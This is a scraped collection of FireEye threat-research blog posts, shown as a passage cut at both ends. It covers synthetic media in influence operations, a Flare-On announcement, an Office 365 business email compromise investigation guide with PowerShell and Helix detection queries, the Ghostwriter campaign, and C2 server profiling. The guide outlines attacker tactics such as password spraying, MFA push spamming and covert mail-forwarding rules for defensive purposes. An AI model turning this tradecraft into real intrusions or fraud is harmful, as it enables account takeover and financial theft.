on\nsocial media to \"astroturf\" political commentary. Synthetic\nmedia has real potential to exacerbate the use and effectiveness of\nsuch tactics. Indeed, we already frequently uncover false personas and networks of\ninauthentic social media accounts using artificially generated profile\nphotos, and this use is widespread. For example, we’ve uncovered large\nnetworks of inauthentic social media accounts pushing pro-China\nnarratives surrounding the Hong Kong democracy protests and the\nCOVID-19 pandemic making significant use of artificially generated\nphotos. We identified inauthentic accounts using synthetic profile\nphotos in a recent operation that appeared designed to support\ngovernment officials in a region of Argentina. And in a social\nmedia-driven influence operation that promoted pro-Cuban government\nand anti-US narratives, the operators behind one network of\ninauthentic accounts didn’t even bother to fully crop out the text box\nplaced by the “thispersondoesnotexist” image generation tool stating\nthat the images were generated with StyleGAN2, prior to use. The\nexamples of artificially generated images we’ve seen actively used in\nIO campaigns presented in Figure 5 illustrate a common format\nobserved, including closely cropped headshots with blurred\nbackgrounds, anomalies around the ears, neck, and shoulders,\ndifficulties with fully rendering accessories such as glasses and\nearrings, and phantom hair strings being generated outside a credible\narea. But we can readily envision an escalation of this tactic, in which\nconvincing personas are created using artificially generated profile\nphotos trained on images of real people from a target group or\ngeography that correspond to, say, a particular minority group, and\nare then used to instigate political conflict or incite animosity and\nviolence. The use of synthetically generated audio interviews in a\ncampaign  resembling Distinguished Impersonator trained on a real\npolitical expert’s voice, would lower an actor’s burden by removing\nthe need to convincingly engage in direct outreach to real people,\nwhich would also make attribution more difficult for investigators by\nreducing available investigative leads such as contact details and\nmodes of communication between actor and target. And synthetic media\nwould drastically lower barriers for actors seeking to disseminate\ndiverse text-based content at scale, reducing the effort required to\ncreate a large corpus of written content and the need to repeatedly\nreuse snippets of identical text. Evading Detection Synthetic media doesn’t need to be overwhelmingly credible to\nhave its desired effect. People are used to consuming short,\nauthoritative, error-riddled social media text at speed without\ndwelling too much on its linguistic features or origin. Users are\naccustomed to consuming poor-quality audio and video snippets, and the\nmajority of users aren’t going to give a social media account’s\nprofile image more than a cursory glance as they scroll through their\nfeed and ingest written content at rapid speed. The quality bar does\nnot need to be exceedingly high when it comes to synthetic\ngenerations; it only needs to be “good enough” for even just a subset\nof vocal users to not question it in a world characterized by rapid,\nhigh-volume information consumption. The unifying theme behind the various potential IO applications\ndiscussed in the previous section is that they would materially help\nthreat actors scale campaigns at low cost and better evade\ndetection. Fine-tuning in particular presents a problem for blue\nteams, as it allows threat actors to better evade classifiers and\ndetection models that are built for pre-trained outputs. This is\nworrisome as a would-be threat actor’s fine-tuning datasets would\nlikely be private and unknown to the defender at test time. This\nconcept is illustrated by the text-based detection experiments we\nconducted in Figure 6. After releasing GPT-2, OpenAI\nreleased source code along with a fine-tuned classifier based on\nRoBERTa , which does not share the same architecture or tokenizer\nas GPT-2, that can reliably discriminate between GPT-2's own output\ngenerations and its original pre-training data of high-Karma Reddit posts. We used this RoBERTa model first to verify the findings that one can reliably differentiate\nbetween fabricated, GPT-2 generated text and the authentic GPT-2\npre-training dataset. When we performed the same exercise using the\nclassifier to try to differentiate our fine-tuned IO text generations\n(i.e. those previously discussed in Figure 4), the accuracy\nsignificantly dropped. The fact that the pre-trained score\ndistribution is skewed towards 1 means the detection model for\npre-trained generations, with a classification threshold of 0.5, can\neasily classify the generations as “fake.” This results in an accuracy\nscore of over 97% for the detection model, as shown in blue in Figure\n6. However, detection accuracy dipped to around 78% for fine-tuned\ngenerations as the distribution of scores output by the classifier\nshifts closer to chance, as shown in red. So if threat actors were to\nfine-tune on a custom dataset they themselves collated, this could\npresent a problematic asymmetry between the data used to create the\nsynthetic generations and the data blue teams would have access to—or\neven knowledge of—with which to build a commensurate detection model. Text with shorter length\nwas previously shown to be more difficult for detection models to\nclassify , and while our tweet-inspired experiments corroborate\nthis finding, further research is required to disentangle how\ndifferent datasets, model complexities, input lengths, and\nhyperparameters will contribute to this effect in the cat-and-mouse\nfuture of generators versus detectors. Conclusion Synthetic media generation continues to become cheaper, both\nmonetarily and in terms of the computing power required, easier, more\npervasive, and their outputs ever more credible. Image generation\ncapabilities and even commercial services are already moving beyond\nmerely headshots and facial generations to full-body shots and\nadvanced video generations, and end users will enjoy increasing\ncontrol over and ease of content generation, both through being able\nto steer generations towards particular attributes at more granular\nlevels, and by being able to use an increasing amount of both free and\ncommercial low-code or no-code applications for content creation. This blog post highlights the need for the research community to\ncontinue to focus attention on the development of technical detection\nand mitigation capabilities for synthetic media, given its ready\napplicability to current information operations tactics. Multiple\navenues of research can and should be pursued, including statistical\napproaches to detection like machine\nlearning classifiers and model\nwatermarking , as well as the signature-based identification of\nfingerprints and forensic indicators (e.g. Figure 5). Secondly,\nthere’s the human aspect to all of this, including the importance of\nensuring communities of researchers from different disciplines\ncoalesce around approaches to overcoming the detection challenges,\nthreat modeling how synthetic media may be deployed in future IO\ncampaigns so that any potential effects can be pre-emptively\naddressed, and encouraging commercial providers of synthetic media\ngeneration capabilities to acknowledge and account for the potential\nabuse of their services by threat actors. Outside of community\nefforts, there also remains the need for raising awareness and\neducating consumers of social media and other content about the risks\nof synthetic media in a responsible manner that doesn’t misrepresent\nthe threat, as well developing legal and regulatory approaches to\ndealing with information operations and synthetic media. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/08/announcing-the-seventh-annual-flare-on-challenge.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-08-04",
                    "source": "www.fireeye.com"
                },
                "text": "The Front Line Applied Research & Expertise (FLARE) team is honored to announce that the popular Flare-On challenge will return for a triumphant seventh year. Ongoing global events proved no match against our passion for creating challenging and fun puzzles to test and hone the skills of aspiring and experienced reverse engineers. The contest will begin at 8:00 p.m. ET on Sept. 11, 2020. This is a CTF-style challenge for all active and aspiring reverse engineers, malware analysts and security professionals. The contest runs for six full weeks and ends at 8:00 p.m. ET on Oct. 23, 2020. This year’s contest features a total of 11 challenges in a variety of formats, including Windows, Linux, Python, VBA and .NET. This is one of the only Windows-centric CTF contests out there and we have crafted it to closely represent the challenges faced by our FLARE team on a daily basis. If you are skilled and dedicated enough to complete the seventh Flare-On challenge, you will receive a prize and recognition on the Flare-On website for your accomplishment. Prize details will be revealed later, but as always, it will be worthwhile swag to earn the envy of your peers. In previous years we sent out belt buckles, replica police badges, challenge coins, medals and huge pins. Check the Flare-On website for a live countdown timer, to view the previous year’s winners, and to download past challenges and solutions for practice. For official news and information, we will be using the Twitter hashtag: #flareon7. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/07/insights-into-office-365-attacks-and-how-managed-defense-investigates.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-07-30",
                    "source": "www.fireeye.com"
                },
                "text": "With Business Email Compromises (BECs) showing no signs of slowing down , it is becoming increasingly important for security analysts to understand Office 365 (O365) breaches and how to properly investigate them. This blog post is for those who have yet to dip their toes into the waters of an O365 BEC, providing a crash course on Microsoft’s cloud productivity suite and its assortment of logs and data sources useful to investigators. We’ll also go over common attacker tactics we’ve observed while responding to BECs and provide insight into how Mandiant Managed Defense analysts approach these investigations at our customers using PowerShell and the FireEye Helix platform . Office 365 Office 365 is Microsoft’s cloud-based subscription service for the Microsoft Office suite. It is built from dozens of applications tightly embedded into the lives of today’s workforce, including: Exchange Online, for emails SharePoint, for intranet portals and document sharing Teams and Skype for Business, for instant messaging OneDrive, for file sharing Microsoft Stream, for recorded meetings and presentations As more and more organizations decide to adopt Microsoft’s cloud-based offering to meet their needs, unauthorized access to these O365 environments, or tenants in Microsoft’s parlance, has become increasingly lucrative to motivated attackers. The current high adoption rate of O365 means that attackers are getting plenty of hands on experience with using and abusing the platform. While many tactics have remained largely unchanged in the years since we’ve first observed them, we’ve also witnessed the evolution of techniques that are effective against even security-conscious users. In general, the O365 compromises we’ve responded to have fallen into two categories: Business Email Compromises (BECs) APT or state-sponsored intrusions Based on our experience, BECs are a common threat to any organization's O365 tenant. The term “BEC” typically refers to a type of fraud committed by financially motivated attackers. BEC actors heavily rely on social engineering to carry out their schemes, ultimately defrauding organizations and even personnel. One common BEC scheme involves compromising a C-suite executive’s account via phishing. Once the victim unwittingly enters their credentials into a web form masquerading as the legitimate Office 365 login portal, attackers log in and instruct others in the organization to conduct a wire transfer, perhaps under the guise of an upcoming acquisition that has yet to be publicly announced. However, we’ve also observed more effective schemes where attackers compromise those in financial positions and patiently wait until an email correspondence has begun about a due payment. Attackers seize this opportunity by sending a doctored invoice (sometimes based on a legitimate invoice that had been stolen earlier) on behalf of the compromised user to another victim responsible for making payments. These emails are typically hidden from the compromised user due to attacker-created Outlook mailbox rules. Often times, by the time the scheme is inevitably discovered and understood days or weeks later, the money is unrecoverable—highlighting the importance of contacting law enforcement immediately if you’ve fallen victim to a fraud. The personal finances of staff aren’t off limits to attackers either. We’ve observed several cases of W-2 scams, in which attackers send a request to HR for W-2 information from the victim’s account. Once obtained, this personally identifiable information is later used to conduct tax fraud. Conversely, APT intrusions are typically more sophisticated and are conducted by state-sponsored threat actors. Rather than for financial gain, APT actors are usually tasked to compromise O365 tenants for purposes of espionage, data theft, or destruction. Given the wealth of sensitive information housed in any given organization’s O365 tenant, APT actors may not even need to touch a single endpoint to complete their mission, sidestepping the many security controls organizations have implemented and invested in. O365 Logs and Data Sources In this section, we’ll touch on the multitude of logs and portals containing forensic data relevant to an O365 investigation. Before we can begin investigating an O365 case, we’ll work with our clients to get an “Investigator” account provisioned with the roles required to obtain the forensic data we need. For the purposes of this blog post, we’ll quickly list the roles needed for an Investigator account, but during an active Managed Defense investigation, a designated Managed Defense consultant will provide further guidance on account provisioning. At a minimum, the Investigator account should have the following roles: Exchange Admin Roles View-only audit logs View-only configuration View-only recipients Mailbox Search Message Tracking eDiscovery Rights eDiscovery Manager role Azure Active Directory Roles Global Reader Unified Audit Log (UAL) The Unified Audit Log records activity from various applications within the Office 365 suite, and can be considered O365’s main log source. Entries in the UAL are stored in JSON format. We recommend using the PowerShell cmdlet Search-UnifiedAuditLog to query the UAL as it allows for greater flexibility, though it can also be acquired from the Office 365 Security & Compliance Center located at protection.office.com . In order to leverage this log source (and the Admin Audit Log), ensure that the Audit Log Search feature is enabled. The UAL has a few nuances that are important to consider. While it provides a good high-level summary of activity across various O365 applications, it won’t log comprehensive mailbox activity (for that, acquire the Mailbox Audit Log). Furthermore, the UAL has a few limitations, namely: Results to a single query are limited to 5000 results Only 90 days of activity are retained Events may take up to 24 hours before they are searchable Mailbox Audit Log (MAL) The Mailbox Audit Log, part of Exchange Online, will capture additional actions performed against objects within a mailbox. As such, it’s a good idea acquire and analyze the MAL for each affected user account with the PowerShell cmdlet Search-MailboxAuditLog . Note that entries in the MAL will be retained for 90 days (by default) and timestamps will be based on the user’s local time zone. The MAL’s retention time can always be increased with the PowerShell cmdlet Set-Mailbox along with the AuditLogAgeLimit parameter. At the time of writing this post, Microsoft has recently released information about enhanced auditing functionality that gives investigators insight into which emails were accessed by attackers. This level of logging for regular user accounts is only available for organizations with an Office 365 E5 subscription. Once Advanced Auditing is enabled, mail access activity will be logged under the MailItemsAccessed operation in both the UAL and MAL. Administrator Audit Log If the Audit Log Search feature is enabled, this supplemental data source logs all PowerShell administrative cmdlets (including command-line arguments) executed by administrators. If you suspect that an administrator account was compromised, don’t overlook this log! The PowerShell cmdlet Search-AdminAuditLog is used to query these logs, but note that the Audit Log Search feature must be enabled and the same 90 day retention limit will be in place. Azure AD Logs Azure AD logs can be accessed from the Azure portal ( portal.azure.com ) under the Azure Active Directory service. Azure AD Sign-in logs contain detailed information about how authentications occur and O365 application usage. Azure AD audit logs are also a valuable source of information, containing records of password resets, account creations, role modifications, OAuth grants, and more that could be indicative of suspicious activity. Note that Azure AD logs are only available for 30 days. Cloud App Security Portal For cases where OAuth abuse has been observed, information about cloud applications can be found in Microsoft’s Cloud App Security portal ( portal.cloudappsecurity.com ). Access to this portal requires an E5 license or a standalone Cloud App license. For more background on OAuth abuse, be sure to check out our blog post: Shining a Light on OAuth Abuse with PwnAuth . Message Traces Message traces record the emails sent and received by a user. During an investigation, run reports on any email addresses of interest. The message trace report will contain detailed mail flow information as well as subject lines, original client IP addresses, and message sizes. Message traces are useful for identifying emails sent by attackers from compromised accounts, and can also aid in identifying initial phishing emails if phishing was used for initial access. To obtain the actual emails, use the Content Search tool. Only the past 10 days of activity is available with the Get-MessageTrace PowerShell cmdlet. Historical searches for older messages can be run with the Get-HistoricalSearch cmdlet (up to 90 days by default), but historical searches typically take hours for the report to be available. Historical reports can also be generated within the Security and Compliance Center. eDiscovery Content Searches The Content Search tool allows investigators to query for emails, documents, and instant message conversations stored in an Office 365 tenant. We frequently run Content Search queries to find and acquire copies of emails sent by attackers. Content searches are limited to what has been indexed by Microsoft, so recent activity may not immediately appear. Additionally, only the most recent 1000 items will be shown in the preview pane. Anatomy of an O365 BEC As mentioned earlier, BECs are one of the more prevalent threats to O365 tenants seen by Managed Defense today. Sometimes, Mandiant analysts respond to several BEC cases at our customers within the same week. With this frontline experience, we’ve compiled a list of commonly observed tactics and techniques to advise our readers about the types of activities one should anticipate. Please note that this is by no means a comprehensive list of O365 attacks, rather a focus on the usual routes we’ve seen BEC actors take to accomplish their objective. Phase 1: Initial Compromise Phishing : Emails with links to credential harvesting forms sent to victims, sometimes from the account of a compromised business partner. Brute force : A large dictionary of passwords attempted against an account of interest. Password spray : A dictionary of commonly used passwords attempted against a list of known user accounts. Access to credential dump : Valid credentials used from a previous compromise of the user. MFA bypasses : Use of mail clients leveraging legacy authentication protocols (e.g. IMAP/POP), which bypass MFA policies. Attackers may also spam push notifications to the victim by repeatedly attempting to log in, eventually leading to the victim mistakenly accepting the prompt. Phase 2: Establish Foothold More phishing : Additional phishing lures sent to internal/external contacts from Outlook’s global address list. More credible lures : New phishing lures uploaded to the compromised user's OneDrive or SharePoint account and shared with the victim’s coworkers. SMTP forwarding : SMTP forwarding enabled in the victim’s mailbox to forward all email to an external address. Forwarding mailbox rules : Mailbox rules created to forward all or certain mail to an external address. Mail client usage : Outlook or third-party mail clients used by attackers. Mail will continue to sync for a short while after a password reset occurs. Phase 3: Evasion Evasive mailbox rules : Mailbox rules created to delete mail or move some or all incoming mail to uncommonly used folders in Outlook, such as “RSS Subscriptions”. Manual evasion : Manual deletion of incoming and sent mail. Attackers may forego mailbox rules entirely. Mail forwarding : Attackers accessing emails without logging in if a mechanism to forward mail to an external address was set up earlier. Mail client usage : Outlook or third-party mail clients used by attackers. Mail can be synced locally to the attacker’s machine and accessed later. VPN usage : VPN servers, sometimes with similar geolocations to their victims, used in an attempt to avoid detection and evade conditional access policies. Phase 4: Internal Reconnaissance Outlook searching : The victim’s mailbox queried by attackers for emails of interest. While not recorded in audit logs, it may be available to export if it was not deleted by attackers. O365 searching : Searches conducted within SharePoint and other O365 applications for content of interest. While not recorded in audit logs, SharePoint and OneDrive file interactions are recorded in the UAL. Mail client usage : Outlook or third-party mail clients used by attackers. Mail can be synced locally to the attacker’s machine and accessed later. Phase 5: Complete Mission Direct deposit update : A request sent to the HR department to update the victim’s direct deposit information, redirecting payment to the BEC actor. W-2 scam : A request sent to the HR department for W-2 forms, used to harvest PII for tax fraud. Wire transfer : A wire transfer requested for an unpaid invoice, upcoming M&A, charities, etc. Third-party account abuse : Abuse of the compromised user’s privileged access to third-party accounts and services, such as access to a corporate rewards site. How Managed Defense Responds to O365 BECs In this section, we’re going to walk through how Managed Defense investigates a typical O365 BEC case. Many of the steps in our investigation rely on querying for logs with PowerShell. To do this, first establish a remote PowerShell session to Exchange Online. The following Microsoft documentation provides guidance on two methods to do this: Connect to Exchange Online PowerShell with Basic authentication Use the Exchange Online PowerShell with modern authentication using V2 module Broad Scoping We start our investigations off by running broad queries against the Unified Audit Log (UAL) for suspicious activity. We’ll review OAuth activity too, which is especially important if something more nefarious than a financially motivated BEC is suspected. Any FireEye gear available to us—such as FireEye Helix and Email Security —will be leveraged to augment the data available to us from Office 365. The following are a few initial scoping queries we’d typically run at the beginning of a Managed Defense engagement. Scoping Recent Mailbox Rule Activity Even in large tenants, pulling back all recent mailbox rule activity doesn’t typically produce an unmanageable number of results, and attacker-created rules tend to stand out from the rest of the noise. Querying UAL for all mailbox rule activity in Helix: class=ms_office365 action:[New-InboxRule, Set-InboxRule, Enable-InboxRule] | table [createdtime, action, username, srcipv4, srcregion, parameters, rawmsg] Query UAL for new mail rule activity in PowerShell: Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) -ResultSize 5000 -Operations \"New-InboxRule\",\"Set-InboxRule\",\"Enable-InboxRule\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Scoping SMTP Forwarding Activity SMTP forwarding is sometimes overlooked because it appears under a UAL operation separate from mailbox rules. This query looks for the Set-Mailbox operation containing a parameter to forward mail over SMTP, indicative of automatic forwarding being enabled from OWA. Querying UAL for SMTP forwarding in Helix: class=ms_office365 action=Set-Mailbox rawmsg:ForwardingSmtpAddress | table [createdtime, action, username, srcipv4, srcregion, parameters, rawmsg] Querying UAL for SMTP forwarding in PowerShell: Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) -ResultSize 5000 -FreeText \"ForwardingSmtpAddress\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Analyze Compromised Users Logs After we’ve finished scoping the tenant, we’ll turn our attention to the individual users believed to be involved in the compromise. We’ll acquire all relevant O365 logs for the identified compromised user(s) - this includes the user's UAL, Mailbox Audit Log (MAL), and Admin audit log (if the user is an administrator). We’ll review these logs for anomalous account activity and assemble a list of attacker IP addresses and User-Agents strings. We’ll use this list to further scope the tenant. O365 investigations rely heavily on anomaly detection. Many times, the BEC actor may even be active at the same time as the user. In order to accurately differentiate between legitimate user activity and attacker activity within a compromised account, it's recommended to pull back as much data as possible to use as a reference for legitimate activity. Using the Helix query transforms groupby < [srccountry,srcregion] , groupby < useragent and groupby < srcipv4 , which highlight the least common geolocations, User Agent strings, and IP addresses, can also assist in identifying anomalies in results. Querying UAL for a user in Helix: class=ms_office365 username=user@client.com | table [createdtime, action, username, srcipv4, srccountry, srcregion, useragent, rawmsg] | groupby < [srccountry,srcregion] Querying UAL for a user in PowerShell: Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -UserIds user@client.com | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Querying MAL for a user in PowerShell: Search-MailboxAuditLog -Identity user@client.com -LogonTypes Owner,Delegate,Admin -ShowDetails -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Querying Admin Audit Log for all events within a certain date in PowerShell: Search-AdminAuditLog -StartDate mm/dd/yyyy -EndDate mm/dd/yyyy | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Query UAL with New Leads Now that we’ve built a list of suspicious IP addresses (or even entire CIDR ranges) and User-Agent strings, we’ll run new queries against the entire UAL to try to identify other compromised user accounts. We’ll repeat this step and the previous step for each newly identified user account. One advantage to using FireEye Helix platform over PowerShell is that we can query entire CIDR ranges. This is helpful when we observe attackers coming from a VPN or ISP that dynamically assigns IP addresses within the same address block. Queries for attacker User-Agent strings usually generate more noise to sift through than IP address searches. In practice, User-Agent queries are only beneficial if the attackers are using an uncommon browser or version of a browser. Due to limitations of the Search-UnifiedAuditLog cmdlet, we’ve had the most success using the FreeText parameter and searching for simple strings. In Helix: class=ms_office365 (srcipv4:[1.2.3.4, 2.3.4.0/24] OR useragent:Opera) | table [createdtime, action, username, srcipv4, srccountry, srcregion, useragent, rawmsg] | groupby username Querying the UAL for IPs and user agents in PowerShell: Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -IPAddresses 1.2.3.4, 2.3.4.5 | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -FreeText \"Opera\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Analyze Message Traces We’ll use PowerShell to query message traces for the compromised users we’ve identified. If the email was sent within the past 10 days, use the Get-MessageTrace cmdlet, which immediately returns results and allows teams to query IP addresses. For older emails, use the Start-HistoricalSearch cmdlet and download the report later from the Mail Flow section of the Security & Compliance center. Querying for the last 10 days of mail sent by the victim in PowerShell: Get-MessageTrace -StartDate (Get-Date).AddDays(-10) -EndDate (Get-Date) -SenderAddress victim@client.com | Select-Object Received, SenderAddress, RecipientAddress, Subject, Status, FromIP, Size, MessageID | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Querying for older emails (up to 90 days) in PowerShell: Start-HistoricalSearch -ReportTitle \"Mandiant O365 investigation\" -StartDate mm/dd/yyyy -EndDate mm/dd/yyyy -ReportType MessageTraceDetail -SenderAddress victim@client.com As Message Trace results are reviewed, attention should be given to IP addresses to determine which emails were sent by attackers. If phishing was the suspected initial compromise vector, it’s a good idea to also query for incoming mail received within a few days prior to the first compromise date and look for suspicious sender addresses and/or subject lines. Acquire Emails of Interest With our list of suspicious emails identified from message traces, we’ll use the Content Search tool available in the Office 365 Security and Compliance Center acquire the email body and learn what domains were used in phishing lures (if phishing was present). Content Searches are performed by using a straightforward GUI, and the results can either be previewed in the browser, downloaded individually as EML files, or downloaded in bulk as PST files. Final Scoping At this point of our investigation, the BEC should be sufficiently scoped within the tenant. To ensure any follow-on activity hasn’t occurred, we’ll take all of the attack indicators and perform our final queries across the UAL. With that said, there are still edge cases in which attacker activity wouldn’t appear in O365 logs. For example, perhaps an additional user has submitted their credentials to a phishing page, but the attackers haven’t used them to log in yet. To ensure we don’t miss this activity, we’ll perform additional scoping across available network logs, specifically for IP addresses and domains related to the attacker’s phishing infrastructure. We’ll also leverage other FireEye products, such as the Endpoint Security platform, to search for phishing domains present on a host’s web browser history. Conclusion Unauthorized access to O365 tenant doesn’t just pose a threat to an organization, but also to its staff and business partners. Organizations without enhanced security controls in O365 are at the greatest risk of experiencing a BEC. However, as multi factor-authentication becomes more and more commonplace, we’ve witnessed an increase of MFA bypass attempts performed by increasingly proficient attackers. It’s important to remember that social engineering plays a primary role throughout a BEC. Ensure that users are trained on how to identify credential harvesting forms, a common compromise vector. When in the midst of a BEC compromise, teams may want to promptly alert personnel in HR and finance-related roles to exercise extra caution when processing requests related to banking or wire transfers while the investigation is in progress. The examples covered in this blog post are just a sample of what Managed Defense performs while investigating an Office 365 compromise. To take a proactive approach at preventing BECs, make sure the following best practices are implemented in a O365 tenant. Additionally, FireEye Email Security offers protections against phishing and the Helix platform’s O365 ruleset can alert on anomalous activity as soon as it happens. Recommended Best Practices Ensure mailbox audit logging is enabled on all accounts Disable Legacy Authentication protocols Enable multi-factor authentication (MFA) Enforce strong passwords and a password expiration policy Forward O365 audit logs to a centralized logging platform for extended retention Enforce an account lockout policy in Azure/on-premise Active Directory Restrict mail forwarding to external domains Acknowledgements Special thanks to Doug Bienstock, Glenn Edwards, Josh Madeley, and Tim Martin for their research and assistance on the topic. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/07/ghostwriter-influence-campaign.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-07-29",
                    "source": "www.fireeye.com"
                },
                "text": "Mandiant Threat Intelligence has tied together several information operations that we assess with moderate confidence comprise part of a broader influence campaign—ongoing since at least March 2017—aligned with Russian security interests. The operations have primarily targeted audiences in Lithuania, Latvia, and Poland with narratives critical of the North Atlantic Treaty Organization’s (NATO) presence in Eastern Europe, occasionally leveraging other themes such as anti-U.S. and COVID-19-related narratives as part of this broader anti-NATO agenda. We have dubbed this campaign “ Ghostwriter .” Many, though not all of the incidents we suspect to be part of the Ghostwriter campaign, appear to have leveraged website compromises or spoofed email accounts to disseminate fabricated content, including falsified news articles, quotes, correspondence and other documents designed to appear as coming from military officials and political figures in the target countries. This falsified content has been referenced as source material in articles and op-eds authored by at least 14 inauthentic personas posing as locals, journalists and analysts within those countries. These articles and op-eds, primarily written in English, have been consistently published to a core set of third-party websites that appear to accept user-submitted content, most notably OpEdNews.com, BalticWord.com, and the pro-Russian site TheDuran.com, among others, as well as to suspected Ghostwriter-affiliated blogs. Some of these incidents and personas have received public attention from researchers, foreign news outlets, or government entities in Lithuania and Poland, but have not been tied to a broader activity set. Others have received little attention and remain relatively obscure. Mandiant Threat Intelligence has independently discovered several Ghostwriter personas and identified additional incidents involving some of those personas previously exposed. We believe the assets and operations discussed in this report are for the first time being collectively tied together and assessed to comprise part of a larger, concerted and ongoing influence campaign. Read the report today to learn more. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/07/scandalous-external-detection-using-network-scan-data-and-automation.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-07-13",
                    "source": "www.fireeye.com"
                },
                "text": "Real Quick In case you’re thrown by that fantastic title, our lawyers made us change the name of this project so we wouldn’t get sued. SCANdalous—a.k.a. Scannah Montana a.k.a. Scanny McScanface a.k.a. “Scan I Kick It? (Yes You Scan)”—had another name before today that, for legal reasons, we’re keeping to ourselves. A special thanks to our legal team who is always looking out for us, this blog post would be a lot less fun without them. Strap in folks. Introduction Advanced Practices is known for using primary source data obtained through Mandiant Incident Response , Managed Defense , and product telemetry across thousands of FireEye clients. Regular, first-hand observations of threat actors afford us opportunities to learn intimate details of their modus operandi. While our visibility from organic data is vast, we also derive value from third-party data sources. By looking outwards, we extend our visibility beyond our clients’ environments and shorten the time it takes to detect adversaries in the wild—often before they initiate intrusions against our clients. In October 2019, Aaron Stephens gave his “Scan’t Touch This” talk at the annual FireEye Cyber Defense Summit (slides available on his Github ). He discussed using network scan data for external detection and provided examples of how to profile command and control (C2) servers for various post-exploitation frameworks used by criminal and intelligence organizations alike. However, manual application of those techniques doesn’t scale. It may work if your role focuses on one or two groups, but Advanced Practices’ scope is much broader. We needed a solution that would enable us to track thousands of groups, malware families and profiles. In this blog post we’d like to talk about that journey, highlight some wins, and for the first time publicly, introduce the project behind it all: SCANdalous. Pre-SCANdalous Case Studies Prior to any sort of system or automation, our team used traditional profiling methodologies to manually identify servers of interest. The following are some examples. The success we found in these case studies served as the primary motivation for SCANdalous. APT39 SSH Tunneling After observing APT39 in a series of intrusions, we determined they frequently created Secure Shell (SSH) tunnels with PuTTY Link to forward Remote Desktop Protocol connections to internal hosts within the target environment. Additionally, they preferred using BitVise SSH servers listening on port 443. Finally, they were using servers hosted by WorldStream B.V. Independent isolation of any one of these characteristics would produce a lot of unrelated servers; however, the aggregation of characteristics provided a strong signal for newly established infrastructure of interest. We used this established profile and others to illuminate dozens of servers we later attributed to APT39 , often before they were used against a target. APT34 QUADAGENT In February 2018, an independent researcher shared a sample of what would later be named QUADAGENT. We had not observed it in an intrusion yet; however, by analyzing the characteristics of the C2, we were able to develop a strong profile of the servers to track over time. For example, our team identified the server 185.161.208\\.37 and domain rdppath\\.com within hours of it being established. A week later, we identified a QUADAGENT dropper with the previously identified C2. Additional examples of QUADAGENT are depicted in Figure 1. Figure 1: QUADAGENT C2 servers in the Shodan user interface Five days after the QUADAGENT dropper was identified, Mandiant was engaged by a victim that was targeted via the same C2. This activity was later attributed to APT34. During the investigation, Mandiant uncovered APT34 using RULER.HOMEPAGE. This was the first time our consultants observed the tool and technique used in the wild by a real threat actor. Our team developed a profile of servers hosting HOMEPAGE payloads and began tracking their deployment in the wild. Figure 2 shows a timeline of QUADAGENT C2 servers discovered between February and November of 2018. Figure 2: Timeline of QUADAGENT C2 servers discovered throughout 2018 APT33 RULER.HOMEPAGE, POSHC2, and POWERTON A month after that aforementioned intrusion, Managed Defense discovered a threat actor using RULER.HOMEPAGE to download and execute POSHC2. All the RULER.HOMEPAGE servers were previously identified due to our efforts. Our team developed a profile for POSHC2 and began tracking their deployment in the wild. The threat actor pivoted to a novel PowerShell backdoor, POWERTON. Our team repeated our workflow and began illuminating those C2 servers as well. This activity was later attributed to APT33 and was documented in our OVERRULED post . SCANdalous Scanner, Better, Faster, Stronger Our use of scan data was proving wildly successful, and we wanted to use more of it, but we needed to innovate. How could we leverage this dataset and methodology to track not one or two, but dozens of active groups that we observe across our solutions and services? Even if every member of Advanced Practices was dedicated to external detection, we would still not have enough time or resources to keep up with the amount of manual work required. But that’s the key word: Manual . Our workflow consumed hours of individual analyst actions, and we had to change that. This was the beginning of SCANdalous: An automated system for external detection using third-party network scan data. A couple of nice things about computers: They’re great at multitasking, and they don’t forget. The tasks that were taking us hours to do—if we had time, and if we remembered to do them every day—were now taking SCANdalous minutes if not seconds. This not only afforded us additional time for analysis, it gave us the capability to expand our scope. Now we not only look for specific groups, we also search for common malware, tools and frameworks in general. We deploy weak signals (or broad signatures) for software that isn’t inherently bad, but is often used by threat actors. Our external detection was further improved by automating additional collection tasks, executed by SCANdalous upon a discovery—we call them follow-on actions. For example, if an interesting open directory is identified, acquire certain files. These actions ensure the team never misses an opportunity during “non-working hours.” If SCANdalous finds something interesting on a weekend or holiday, we know it will perform the time-sensitive tasks against the server and in defense of our clients. The data we collect not only helps us track things we aren’t seeing at our clients, it allows us to provide timely and historical context to our incident responders and security analysts. Taking observations from Mandiant Incident Response or Managed Defense and distilling them into knowledge we can carry forward has always been our bread and butter. Now, with SCANdalous in the mix, we can project that knowledge out onto the Internet as a whole. Collection Metrics Looking back on where we started with our manual efforts, we’re pleased to see how far this project has come, and is perhaps best illustrated by examining the numbers. Today (and as we write these continue to grow), SCANdalous holds over five thousand signatures across multiple sources, covering 